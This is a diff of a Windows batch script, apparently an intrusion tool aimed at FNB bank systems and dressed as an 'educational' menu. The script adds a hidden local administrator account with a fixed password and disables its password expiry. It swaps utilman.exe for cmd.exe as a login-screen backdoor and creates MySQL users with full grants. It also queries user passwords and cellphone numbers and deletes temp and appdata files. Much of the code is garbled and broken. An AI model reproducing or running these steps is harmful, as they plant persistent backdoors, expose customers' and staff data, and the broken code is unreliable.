@@ -1,9 +1,10 @@
 @echo off
 break off
 title C:\windows\system32\cmd.exe
+compmgmt.msc
 :cmd
 color 1A
-
+:main
 echo :.....................................................................................
 echo :.....................................................................................
 echo          ::::::::::::    ::          ::::::::::::    ::         ::
@@ -18,49 +19,58 @@ echo          ::        ::    ::          ::              ::         ::
 echo          ::::::::::::    ::::::::::  ::::::::::::    :::::::::::::
 echo:.....................................................................................:
 echo      This Program was developed for only educational purposes,try on illigal attempts
-echo            We are not resposible for any actions::::BluePriar_Forencics
+echo            We are not resposible for any actions::::BluePriar_Forencics Priar@github
 echo:.....................................................................................:
 
-:main
+
 echo                                          OPTIONS MENU
 
 
+     
+echo ::1 :hogan.fnb.co.za/v3270DoAuth/#/                                            ::10:POS
+echo ::2 :premium.dynamics.fnb.co.za/Premium/main.aspx#474677994                    ::11:The Harvester
+echo ::3 :fnb2web/cbsbrdreversalcentre/                                             ::12:FireWall Settings
+echo ::4 :folders.fnb.co.za:8443/folders/fnb/controller                             ::13:CloudFlare Bypass
+echo ::5 :reset BIOS PWD                                                            ::14:Open All Ports
+echo ::6 :Administrative PWD                                                        ::15:Delete WinDir to Crush
+echo ::7 :Server                                                                    ::16:Shutdown
+echo ::8 :Add Server User                                                           ::17:Restart
+echo ::9 :Add Mysql User                                                            ::18:Logoff
 
-echo 1 :hogan.fnb.co.za/v3270DoAuth/#/
-echo 2 :premium.dynamics.fnb.co.za/Premium/main.aspx#474677994
-echo 3 :fnb2web/cbsbrdreversalcentre/
-echo 4 :folders.fnb.co.za:8443/folders/fnb/controller
-echo 5 :reset BIOS PWD
-echo 6 :Administrative PWD
-echo 7 :Server 
-echo 8 :Add Server User
-echo 9 :Add Mysql User
    
 :: Prompt for input;
       
-        set /p "strMenu=                       ENTER OPTION NUMBER:"
+        set /p "strMenu=                       ENTER OPTIONS MENU NUMBER:"
 
 :: Compare input through if commands,
 :: 'if not defined strMenu goto :menu' can be used here if prefered.
 if "%strMenu%" equ "1" start "" https://hogan.fnb.co.za/v3270DoAuth/#/"
-if "%strMenu%" equ "2" start "" https://premium.dynamics.fnb.co.za/Premium/main.aspx#474677994"
+if "%strMenu%" equ "2" start "" 
 if "%strMenu%" equ "3" start "" http://fnb2web/cbsbrdreversalcentre/"
 if "%strMenu%" equ "4" start "" https://folders.fnb.co.za:8443/folders/fnb/controller 
-if "%strMenu%" equ "5" start "" 
-if "%strMenu%" equ "6" start "" 
-if "%strMenu%" equ "7" start "" 
-if "%strMenu%" equ "8" start "" 
-if "%strMenu%" equ "9" start "" 
+if "%strMenu%" equ "5" start ""5" 
+if "%strMenu%" equ "6" start "" 6"
+if "%strMenu%" equ "7" start "" 7"
+if "%strMenu%" equ "8" start "" 8"
+if "%strMenu%" equ "9" start ""9" 
+if "%strMenu%" equ "10" start ""10"
+if "%strMenu%" equ "11" start "" 11"
+if "%strMenu%" equ "12" start "" 12"
+if "%strMenu%" equ "13" start "" 13"
+if "%strMenu%" equ "14" start "" 14"
+if "%strMenu%" equ "15" start ""15"
+if "%strMenu%" equ "16" start ""16"
+if "%strMenu%" equ "17" start ""17"
+if "%strMenu%" equ "18" start ""18" https://premium.dynamics.fnb.co.za/Premium/main.aspx#474677994"
 
-start "" "Option" ""
-  if "%strOption%" equ "1"  goto 
+  if "%strOPTIONS MENU%" equ "1"  goto 
    start runas /noprofile /user:ef453672 localadminscript.bat 
     set /p input=input
 if "%input%" =="1"  goto A1 
   echo
      :A1
 color 32
- echo
+  echo
 ::BatchGotAdmin 
 REM --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
@@ -83,9 +93,9 @@ REM --> Check for permissions
  
      if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" ) 
 
-pushd "%CD%" 
-CD /D "%~dp0"
-pause
+pushd "%CD%"
+  CD /D "%~dp0"
+
 :------------------------------------------------------------------
  echo
   net user ef453672 fnb@2021 /add  /https://hogan.fnb.co.za/v3270DoAuth/#/ /active
@@ -95,108 +105,53 @@ pause
 WMIC USERACCOUNT WHERE "Name='ef453672"'
  SET Passwordchangeable=FALSE
 
- if "%error%" equ "5"  goto A2
-
-echo
-:A2
-color B2
+ if "%System error%" equ "1378"  goto A2
   net user ef453672 fnb@2021 /add /active
     net localgroup Administrators ef453672 /add
-
     WMIC USERACCOUNT WHERE "Name='ef453672"'
      SET PasswordExpires=FALSE
 WMIC USERACCOUNT WHERE "Name='ef453672"'
  SET Passwordchangeable=FALSE
-        ipconfig /all
-echo 
-  pause
-
-net user %Administrator% fnb@2021 
-
-  net user
-
-set /p input=input
-if "%input%" =="m" goto main 
-
-  if "%strOption%" equ "2" goto
-  start runas /noprofile /user:ef453672 localadminscript.bat
-set /p input=input
-if "%input%" =="2"  goto A7
+echo
+:A2
+color B2
+ rename C:\windows\system32\cmd.exe cmd2.exe
+   rename C:\windows\system32\utilman.exe cmd.exe
+ rename C:\windows\system32\cmd2.exe utilman.exe
     echo
      :A7
 color 3B 
-  echo
- VERIFY errors 2 > nul   
-SETLOCAL ENABLEEXTENSIONS   IF ERRORLEVEL 1 
-echo Unable to enable extensionsREM before you start, 
-you need to write out your SQLCMD credentials to a file in your userrem area using code like this, if you use SQL Server Credentials ...Rem echo -S MyServer -U MyUserName -P MyPassword>%userProfile%\MyServerSqlCmd.txtREM ... or like this if you use windows securityREM echo -S MyServer  >%userProfile%\MyServerSqlCmd.txtREMREM read in your SQLCMD command and credentialsSet /p TheServer=<%userProfile%\MyServerSqlCmd.txtREM Specify your work directory. I chose 'RunBatch' in my user areaSet workpath=%userProfile%\RunBatchREM specify the name of your SQLCMD fileSet TheSQLCMDFileToExecute=%workpath%\SQLCMDFile.sqlREM Specify what preliminary file you need to set up Set PreliminarySQL=S:\work\Github\JSONSQLServerRoutines\SaveExtendedJsonDataFromTable.sqlREM choose the name of your error fileSet Errorfile=%workpath%\error.logREM and specify the name of your database that you want to useSet Database=AdventureWorks2016REM check whether the workpath directory existsif not exist "%workpath%\" (md %workpath%) if ERRORLEVEL 1 (  echo An error creating "%workpath%" directory occurred   goto bombsite)
-REM check whether the database directory within the workpath directory exists
-if not exist "%workpath%\%Database%\" (md %workpath%\%Database%) 
-if ERRORLEVEL 1 (	
-echo An error creating "%workpath%\%Database%" occurred goto bombsite)
-rem Write out the header to the SQLCMD file to execute(
-echo --specify the name of the error fileecho 
-:Error "%Errorfile%"echo --Execute prelimiaryecho 
-:r %PreliminarySQL%echo USE %Database%echo :XML on
-echo set nocount on) >%TheSQLCMDFileToExecute%
-Rem Create the query that brings you the list of tables
-Set QUERY="SET NOCOUNT ON; SELECT Object_Schema_Name(object_id)+'.'+name AS The_Tables FROM sys.tables 
-WHERE is_ms_shipped=0;"REM Execute the query and create the entire SQL Command file that will be executedfor 
-/F usebackq %%i in (`sqlcmd %TheServer% -d %Database% -h -1  -f 65001  -Q %QUERY%`) do 
-(rem for every tablespec in the list append the following text ....       
- if ERRORLEVEL 1 (	  
-echo An error accessing  %Database%  to get the list of tables occurred         
-  goto bombsite)	(	
-echo :Out %workpath%\%Database%\%%i.json	
-echo DECLARE @Json NVARCHAR^(MAX^)       
- echo EXECUTE #SaveExtendedJsonDataFromTable @TableSpec=^'%%i^',@JSONData=@json OUTPUT   
-     echo Select @json	echo GO	) >>%TheSQLCMDFileToExecute% 		     ) 
-Rem Now that is done, we just execute the filesqlcmd 
-%TheServer% -d %Database% -f 65001 -y 0 -i %TheSQLCMDFileToExecute%
-if ERRORLEVEL 1 (  echo An error running the script %TheSQLCMDFileToExecute% on %TheServer% occurred   
-goto bombsite)goto end :bombsite
-Echo We bombed!
-color 0C
-END LOCAL
-Exit /b 1
-:end Echo Yes! We got here at last!!
-ENDLOCAL
-Exit /b 0
-start sqlcmd
-   echo
-          mysql -u root -ppassword
+         C:\Program\Files\MySQL\MySQL Server 5.5\bin\mysql.exe  mysql -u root -ppassword
      mysql -h host -u user -p -e 'SHOW TABLES'
 mysql -uroot -ppassword --execute="CREATE USER ' priar.changchat'@'fnb.co.za' IDENTIFIED BY '77585010eI';"
    mysql -uroot -ppassword --execute="GRANT ALL ON myDB.* TO ' priar.changchat'@'fnb.co.za';"
  mysql -uroot -p -se "SELECT CONCAT('HOW GRANTS FOR \ '',user '\'@\'',host, '\';') FROM mysql.user;" >grants.sql
  mysql -uroot -p <grants.sql
-mysql> select Host, Db, User, Name, Password, Address, Cellphone, Insert_priv, Update_priv, Delette_Priv, Edit_priv, Safe_priv, Create_tmp_priv, Alter_priv from mysql.db limit all;
-       c;\mysql\bin\mysql < install.sql
-if "%error%" equ "5"  goto 
-echo
-    :A4
-color 25
-     echo
-   c:\>mysql.exe -u root -ppassword
-if "%ERROR%" equ " 2003 ( HY000): Can't connect to MySQL server on 'localhost' (10061)"
- then
-runas /noprofile /user:ef453672 localadminscript.bat
- cmd/K"C:\Program\Files\MySQL\MySQL Server 5.5\bin\mysql.exe" -uroot -ppassword safe
-end 
- pause
+mysql> select Host, Db, User, Name, Employee ID, Password, Role, Address, Cellphone, Insert_priv, Update_priv, Delette_Priv, Edit_priv, Safe_priv, Create_tmp_priv, Alter_priv from mysql.db limit all
+            netsh interface ip  set address "Local Area Connection" dhcp
+
+netsh interface ip set dns "Local Area Connecion" dhcp
+
+    netsh interface ip show config 
+
+  net user %Administrator% fnb@2021 
+
+  net user
+
+        ipconfig /all
+msg * your are such a life safer and thanks for Adding me to your System you won't recret it will truly utilise the chance!!!
+
 set /p input=input  
-if "%input%" =="m" goto main 
-
+if "%input%" =="m" goto main
 
 echo
- if "%strOption%" equ "3" goto
-  start runas /noprofile /user:ef453672 localadminscript.bat 
+ if "%strOPTIONS MENU%" equ "3" goto A10
 set /p input=input
 if "%input%" =="3"  goto A10
   echo
 :A10
 color cA
-echo
+  echo
     http://fnb2web/cbsbrdreversalcentre/
 end
    pause 
@@ -205,8 +160,8 @@ set /p input=input
 if "%input%" =="m" goto main 
 
 
-   if "%strOption%" equ "4" goto
-  start runas /noprofile /user:ef453672 localadminscript.bat 
+   if "%str%OPTIONS MENU" equ "4" goto A20
+         runas \windows\system32\cmd localadminscript.bat
 set /p input=input
 if "%input%" =="4"  goto A20
   echo
@@ -220,11 +175,10 @@ pause
 set /p input=input
 if "%input%" =="m" goto main 
 
-if "%strOption%" equ "5" goto
-  start runas /noprofile /user:ef453672 localadminscript.bat 
+if "%strOPTIONS MENU%" equ "5" goto A22
+    runas \windows\system32\cmd localadminscript.bat
 set /p input=input
 if "%input%" =="5"  goto A22
-
   :A22
 color B2
 echo
@@ -234,15 +188,14 @@ echo
 end
    then 
  echo
-  msg * your are such a life safer and thanks for Adding me to your System you won't recret it will truly utilise the chance!!! 
-pause
+ pause
  echo        
 set /p input=input
 if "%input%" =="m" goto main 
 
 
-if "%strOption" equ "6" goto
-  start runas /noprofile /user:ef453672 localadminscript.bat
+if "%strOPTIONS MENU" equ "6" goto A24
+   runas \windows\system32\cmd localadminscript.bat
 set /p input=input
 if "%input%" =="6"  goto A24 
  echo
@@ -257,11 +210,10 @@ end
 set /p input=input
 if "%input%" =="m" goto main   
 
-if "%strOption%" equ "7" goto
-   start runas /noprofile /user:ef453672 localadminscript.bat
+if "%strOPTIONS MENU%" equ "7" goto A25
+    runas \windows\system32\cmd localadminscript.bat
 set /p input=input
 if "%input%" =="7"  goto A25
- echo
   :A25
 color 3B
   echo
@@ -293,8 +245,8 @@ set /p input=input
 if "%input%" =="m" goto main 
 
 
-  if "%strOption%" equ "8" goto
-      runas \windows\system32\cmd localadminscript.bat
+  if "%strOPTIONS MENU%" equ "8" goto A21
+     runas \windows\system32\cmd localadminscript.bat
 set /p input=input
 if "%input%" =="8"  goto A21
     echo
@@ -315,13 +267,13 @@ Add-Type -AssemblyName Microsoft.VisualBasicAdd-Type
 set /p input=input
 if "%input%" =="m" goto main 
 
-  if "%strOption%" equ "9" goto
+  if "%strOPTIONS MENU%" equ "9" goto A26
      runas \windows\system32\cmd localadminscript.bat
 set /p input=input
 if "%input%" =="9"  goto A26
 echo
  :A26
-color cA
+color cB
 pause
 echo please enter your first and last name ( eg. David 
 Martin) and press [ENTER]:
@@ -344,9 +296,65 @@ net share "%fullname%"=D:\%fullname%"
 echo %results% was returned
   echo
    pause
+if "%strOPTIONS MENU%" equ "10"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
 :A4
 color 25
 echo
+if "%strOPTIONS MENU%" equ "11"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+
+:A4
+color cB
+echo
+if "%strOPTIONS MENU%" equ "12"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+:A4
+color cB
+echo
+if "%strOPTIONS MENU%" equ "13"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+:A4
+color cB
+echo
+if "%strOPTIONS MENU%" equ "14"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+:A4
+color 3B
+echo
+if "%strOPTIONS MENU%" equ "15"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+:A4
+color 2B
+echo
+if "%strOPTIONS MENU%" equ "16"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+:A4
+color 4B
+echo
+if "%strOPTIONS MENU%" equ "17"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
+  pause
+:A4
+color 5C
+echo
+if "%strOPTIONS MENU%" equ "18"  goto 
+   start runas /noprofile /user:ef453672 localadminscript.bat 
+    set /p input=input
   pause
     del /q %appdata%
  del /q %temp%
